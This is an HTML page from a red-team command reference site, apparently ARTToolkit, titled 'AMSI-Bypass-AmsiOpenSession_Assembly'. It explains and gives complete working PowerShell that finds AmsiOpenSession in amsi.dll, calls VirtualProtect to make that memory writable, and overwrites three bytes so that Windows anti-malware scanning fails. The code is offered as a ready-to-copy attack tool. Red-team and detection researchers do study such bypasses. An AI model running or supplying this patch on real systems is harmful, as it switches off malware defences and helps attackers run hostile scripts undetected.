<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <title>
            
            
            amsi bypass amsiopensession_assembly
            
            |
            
            ARTToolkit
        </title>
        <link rel="icon" href="/assets/logo.png">
        <link id="pagestyle" rel="stylesheet" href="/assets/style.css" type="text/css"/>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">
        <script async defer src="https://buttons.github.io/buttons.js"></script>
    </head>
    <body>
        <script type="text/javascript">
            

            document.addEventListener('DOMContentLoaded', function () {
            var checkbox = document.querySelector('input[type="checkbox"]');
            checkbox.addEventListener('change', function () {
                if (checkbox.checked) {
                    document.getElementById('pagestyle').setAttribute('href','/assets/styleDark.css');
                    localStorage["style"] = "true";
                
                } else {
                    document.getElementById('pagestyle').setAttribute('href','/assets/style.css');
                    localStorage["style"] = "false";
                }
            });
            });

        </script>

 
        <a href="https://github.com/arttoolkit/arttoolkit.github.io" class="github-corner" aria-label="View source on Github"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
        

<h1>
    
    <a href="/">..</a> /
    
    AMSI-Bypass-AmsiOpenSession_Assembly
    <div class="github-buttons">
        <a class="github-button" href="https://github.com/arttoolkit/arttoolkit.github.io" data-icon="octicon-star" data-show-count="true" aria-label="Star arttoolkit/arttoolkit.github.io on GitHub">Star</a>
        <label class="switch">
            <input type="checkbox">
            <span class="slider round"></span>
        </label>
        <script type="text/javascript">        
            if(localStorage["style"]=="true"){
                document.getElementById('pagestyle').setAttribute('href','/assets/styleDark.css');
                document.querySelector('input[type="checkbox"]').checked = true
            }
        </script>
    </div>
</h1>


<ul class="filter-list">
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    <li><a href="/wadcoms/AMSI-Bypass-AmsiOpenSession_Assembly/#Bypassing">Bypassing</a></li>
    
    

    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    <li><a href="/wadcoms/AMSI-Bypass-AmsiOpenSession_Assembly/#Shell">Shell</a></li>
    
    

    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    <li><a href="/wadcoms/AMSI-Bypass-AmsiOpenSession_Assembly/#AV">Antivirus</a></li>
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    

    
    
    
    
    
    
    
    
    <li><a href="/wadcoms/AMSI-Bypass-AmsiOpenSession_Assembly/#Windows">Windows</a></li>
    
    
    
    
    
    
</ul>


<p>With this code in Powershell it is possible to bypass the AMSI. Weâ€™ll modify the assembly instructions themselves instead of the data they are acting upon in a technique known as binary patching. We can use this technique to hotpatch the code and force it to fail even if the data structure is valid. This is done by overwriting the 3 Bytes TEST RDX,RDX with an XOR RAX,RAX instruction, forcing the execution flow to the error branch, which will disable AMSI.</p>

<p>Command Reference:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Obtain the memory address of AmsiOpenSession (Lookup Function)

Modify the memory permissions where AmsiOpenSession is located (Lookup with DelegateType)

Modify the three bytes at that location. (TEST RDX,RDX with an XOR RAX,RAX, Copy function)
</code></pre></div></div>


Command:
<a href="javascript:void(0)" onClick="copyFunction_com()" style="float: right; margin-bottom: -10px;"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="code_img"/></a>
<ul class="examples">
    <li>
	<pre><code id="code_text">AMSI bypass in assembly based on the AmsiOpenSession
</code></pre>
    </li>

</ul>


Extra code:
<a href="javascript:void(0)" onClick="copyFunction_com()" style="float: right; margin-bottom: -10px;"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="code_img"/></a>
<ul class="examples">
    <li>
	<pre><code id="code_text">function LookupFunc { 
  Param ($moduleName, $functionName)
  
  $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
  Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split(&#39;\\&#39;)[-1].
      Equals(&#39;System.dll&#39;) }).GetType(&#39;Microsoft.Win32.UnsafeNativeMethods&#39;)
  $tmp=@()
  $assem.GetMethods() | ForEach-Object {If($_.Name -eq &quot;GetProcAddress&quot;)
  {$tmp+=$_}} 
  return $tmp[0].Invoke($null, @(($assem.GetMethod(&#39;GetModuleHandle&#39;)).Invoke($null, @($moduleName)), $functionName)) 
}

function getDelegateType {
  Param (
      [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
      [Parameter(Position = 1)] [Type] $delType = [Void] 
  )
  $type = [AppDomain]::CurrentDomain.
  DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(&#39;ReflectedDelegate&#39;)), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule(&#39;InMemoryModule&#39;, $false).DefineType(&#39;MyDelegateType&#39;, &#39;Class, Public, Sealed, AnsiClass, AutoClass&#39;, [System.MulticastDelegate])

  $type.DefineConstructor(&#39;RTSpecialName, HideBySig, Public&#39;, [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags(&#39;Runtime, Managed&#39;)

  $type.DefineMethod(&#39;Invoke&#39;, &#39;Public, HideBySig, NewSlot, Virtual&#39;, $delType, $func).SetImplementationFlags(&#39;Runtime, Managed&#39;)

  return $type.CreateType() 
}

[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession
$oldProtectionBuffer = 0
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer) 

$buf = [Byte[]] (0x48, 0x31, 0xC0)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)
</code></pre>
    </li>

</ul>


References:
<br>
<br>

<a href="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#Patching-AMSI-AmsiOpenSession">https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#Patching-AMSI-AmsiOpenSession</a>
<br>
<br>

<script>

function copyFunction_com() {
	 var copyCommand = document.getElementById("code_text");

	 navigator.clipboard.writeText(copyCommand.innerText.replace(/\n+$/, "")).then(() => {
		 document.getElementById("code_img").alt = "Copied";
		 document.getElementById("code_img").title = "Copied";
	 }, () => {
		 console.log("copy failed");
	 });
}
</script>

        <script>
         // add permalink on headings
         document.querySelectorAll('h2, h3, h4, h5, h5').forEach((heading) => {
             const link = document.createElement('a');
             link.className = 'permalink';
             link.href = `#${heading.id}`;
             heading.appendChild(link);
         });
        </script>
    </body>
</html>
